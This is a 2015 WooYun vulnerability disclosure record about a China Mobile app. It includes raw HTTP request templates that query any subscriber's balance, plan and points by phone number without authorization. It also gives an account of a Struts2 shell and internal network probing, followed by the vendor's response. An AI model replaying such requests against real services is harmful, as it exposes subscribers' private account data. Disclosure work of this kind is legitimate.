{"id": 71300, "wybug_id": "wooyun-2015-0144421", "wybug_title": "中国移动某处app缺陷getshell(可内网)", "wybug_corp": "中国移动", "wybug_author": "scanf", "wybug_date": "2015-10-01 19:06", "wybug_open_date": "2015-11-24 17:06", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-24：\t细节向公众公开  简要描述： 国庆没事干,日日站.可以查询全国移动用户余额,积分,套餐信息. 详细说明：  先是因为开学了没有流量了就关注了中国移动的相关活动.发现新出来一个流量助手.然后就有了这个漏洞.下载流量助手.http://**.**.**.**/gfms/app/apk/html/安装登录后抓包感觉可以任意登录但是burp复制中文乱码.查询余额\nPOST /gfms/front/hn/busi!getRealFee HTTP/1.1Host: **.**.**.**Content-Type: application/x-www-form-urlencodedConnection: keep-aliveProxy-Connection: keep-aliveAccept: */*User-Agent: G4Manager/2.1.0 (iPhone; iOS 8.4; Scale/3.00)Accept-Language: zh-Hans;q=1Accept-Encoding: gzip, deflateContent-Length: 114cityCode=1234&deviceType=201&moduleId=cx_00001&phoneNumber=要查询的手机号&provinceCode=230&staPhoneNumber=要查询的手机号\n把要查询的替换就行了用这个号码试试看吧 13888888888果真土豪\n\n看套餐\nPOST /gfms/front/hn/busi!getPackageInfo HTTP/1.1Host: **.**.**.**Content-Type: application/x-www-form-urlencodedConnection: keep-aliveProxy-Connection: keep-aliveAccept: */*User-Agent: G4Manager/2.1.0 (iPhone; iOS 8.4; Scale/3.00)Accept-Language: zh-Hans;q=1Accept-Encoding: gzip, deflateContent-Length: 114cityCode=1234&deviceType=201&moduleId=cx_00001&phoneNumber=要查询的手机号&provinceCode=230&staPhoneNumber=要查询的手机号\n\n\n查积分\nPOST /gfms/front/hn/busi!getPoints HTTP/1.1Host: **.**.**.**Content-Type: application/x-www-form-urlencodedConnection: keep-aliveProxy-Connection: keep-aliveAccept: */*User-Agent: G4Manager/2.1.0 (iPhone; iOS 8.4; Scale/3.00)Accept-Language: zh-Hans;q=1Accept-Encoding: gzip, deflateContent-Length: 114cityCode=1234&deviceType=201&moduleId=cx_00001&phoneNumber=要查询的手机号&provinceCode=230&staPhoneNumber=要查询的手机号\n   漏洞证明：  然后是getshell**.**.**.**/ctp/service/loginCase.do打开app的时候抓到一个这个然后存在st2但是有负载什么的/home/opt/tomcat-sagav333_zh_loginDevice_8090/webapps/ctp//home/opt/tomcat-sagav333_zh_loginDevice/webapps/ctp//opt/tomcat-sagav333_zh_loginDevice/webapps/ctp//home/opt/tomcat-sagav333_zh_loginDevice_8091/webapps/ctp/以上4个路径都要上传一个才行.\n\n这个是入口**.**.**.**/ctp/\n\n\n\n\n\n测试记录\n\n随便点一个看看\n\n\n\n\n\n还有其他的就不一一查看了不能访问公网ip http代理也不行 就用了脚本看看内网的服务\n\n\n\n\n\n   修复方案：  服务端验证请求的合法性.升级框架.   版权声明：转载请注明来源 scanf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-10-10 17:04 厂商回复： CNVD确认所述情况,已经转由CNCERT向中国移动集团公司通报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-01 19:12 |    \t\tBurn Egg \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:8        | 经验，范围，字典，思维)\t\t \n   = =厉害    \n     2015-10-01 19:16 |    \t\t不会游泳的鱼 \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:41        | 非著名白帽子)\t\t \n  大牛带带我    \n     2015-10-01 19:40 |    \t\tMartial \t\t\t( 普通白帽子  |\t\t\t        Rank:1420 漏洞数:218        )\t\t \n  注孤啊    \n     2015-10-01 23:22 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  大牛带带我     \n     2015-10-07 11:09 |    \t\tMr.lin \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 这个人很赖。撸一撸)\t\t \n  围观，我看看就好    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}